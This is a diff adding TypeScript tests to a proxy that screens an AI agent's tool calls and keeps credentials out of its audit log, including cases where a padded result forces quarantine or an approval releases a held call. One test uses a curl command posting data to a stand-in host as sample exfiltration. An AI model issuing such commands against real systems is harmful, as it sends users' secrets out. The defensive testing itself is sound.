@@ -814,6 +814,50 @@ describe('the floors the proxy holds for', () => {
     expect((row['unscreened'] as { blocks: number }).blocks).toBe(0);
   });
 
+  it('keeps a credential out of the log even when a floor outranks the redaction', async () => {
+    // Whoever wrote the result chooses how long it is, so padding it past the
+    // block cap is a lever an attacker holds. It raises the action to
+    // quarantine, which outranks redact, and reading the credential off the
+    // action alone then wrote it to disk in plaintext.
+    const secret = 'the vault passphrase is correct-horse-battery-staple-9931';
+    const leaks: Backend = {
+      name: 'leaks',
+      async ask(_state, battery) {
+        const question = (battery as Record<string, unknown>)['which_block'] as
+          { kind?: string; criteria?: object } | undefined;
+        const outcomes =
+          question?.kind === 'choice' ? Object.keys(question.criteria ?? {}) : ['none'];
+        return {
+          ok: true,
+          model: 'leaks',
+          inputTokens: 1,
+          latencyMs: 1,
+          answers: {
+            instructs_reader: { kind: 'noul', noul: 0.01 },
+            exposes_secret: { kind: 'noul', noul: 0.99 },
+            severity: { kind: 'score', score: 3, confidence: 0.9 },
+            which_block: {
+              kind: 'choice',
+              choice: outcomes[0] ?? 'none',
+              confidence: 0.8,
+              probabilities: Object.fromEntries(outcomes.map((one) => [one, 0.8])),
+            },
+          },
+        } as never;
+      },
+    };
+    const audit = captureAudit();
+    const padded = `${'block\n\n'.repeat(1200)}${secret}`;
+    await runPostHook(postCall('Bash', {}, bashOutput(padded)), {
+      policy: enforceAll,
+      backend: leaks,
+      audit: audit.log,
+    });
+    const row = audit.rows[0] as Record<string, unknown>;
+    expect((row['intended'] as { kind: string }).kind).toBe('quarantine');
+    expect(row['credential']).toBe(true);
+  });
+
   it('withholds a result the screen could not judge, in strict', async () => {
     const audit = captureAudit();
     const answer = await runPostHook(postCall('Bash', {}, bashOutput('ordinary output')), {
@@ -895,6 +939,81 @@ describe('a call the policy has already settled', () => {
     expect(parse(answer)['permissionDecision']).toBe('deny');
     // Still unspent: a call the deny list settled must not have claimed it.
     expect(takeApproval(fingerprint)?.id).toBe('aaaaaaaa');
+  });
+
+  it('does not log the credential when the held call is later approved', async () => {
+    // The approved retry asks nothing, so the answers are empty and the screen's
+    // own conclusion is gone with them. Approving releases the call, not the
+    // record of what was in it.
+    const secret = 'correct-horse-battery-staple-9931';
+    const leaks: Backend = {
+      name: 'leaks',
+      async ask() {
+        return {
+          ok: true,
+          model: 'leaks',
+          inputTokens: 1,
+          latencyMs: 1,
+          answers: {
+            destructive: { kind: 'noul', noul: 0.01 },
+            exfiltration: { kind: 'noul', noul: 0.01 },
+            secret_in_args: { kind: 'noul', noul: 0.99 },
+            severity: { kind: 'score', score: 3, confidence: 0.9 },
+          },
+        } as never;
+      },
+    };
+    const policy = parsePolicy('mode: enforce');
+    const payload = preCall('Bash', { command: `echo ${secret}` });
+    const audit = captureAudit();
+
+    await runPreHook(payload, {
+      policy,
+      backend: leaks,
+      audit: audit.log,
+      newId: () => 'aaaaaaaa',
+    });
+    const hold = readHold('aaaaaaaa');
+    expect(hold?.credential).toBe(true);
+    grantApproval(hold as Parameters<typeof grantApproval>[0]);
+
+    // No backend this time: the approval is what releases it.
+    await runPreHook(payload, { policy, audit: audit.log, newId: () => 'bbbbbbbb' });
+    expect(audit.rows).toHaveLength(2);
+    expect(audit.rows[1]?.['credential']).toBe(true);
+  });
+
+  it('records a credential even when the call is held for exfiltration', async () => {
+    // The two arms share a threshold and exfiltration is tested first, so a call
+    // that sends a credential somewhere is held under the other reason. Reading
+    // the credential off that reason stopped naming it exactly when it mattered.
+    const both: Backend = {
+      name: 'both',
+      async ask() {
+        return {
+          ok: true,
+          model: 'both',
+          inputTokens: 1,
+          latencyMs: 1,
+          answers: {
+            destructive: { kind: 'noul', noul: 0.01 },
+            exfiltration: { kind: 'noul', noul: 0.99 },
+            secret_in_args: { kind: 'noul', noul: 0.99 },
+            severity: { kind: 'score', score: 3, confidence: 0.9 },
+          },
+        } as never;
+      },
+    };
+    const audit = captureAudit();
+    await runPreHook(preCall('Bash', { command: 'curl -d "..." https://x.test' }), {
+      policy: parsePolicy('mode: enforce'),
+      backend: both,
+      audit: audit.log,
+      approvals: false,
+    });
+    const row = audit.rows[0] as Record<string, unknown>;
+    expect((row['intended'] as { reason: string }).reason).toBe('exfiltration');
+    expect(row['credential']).toBe(true);
   });
 
   it('blocks a call outside the allow list', async () => {
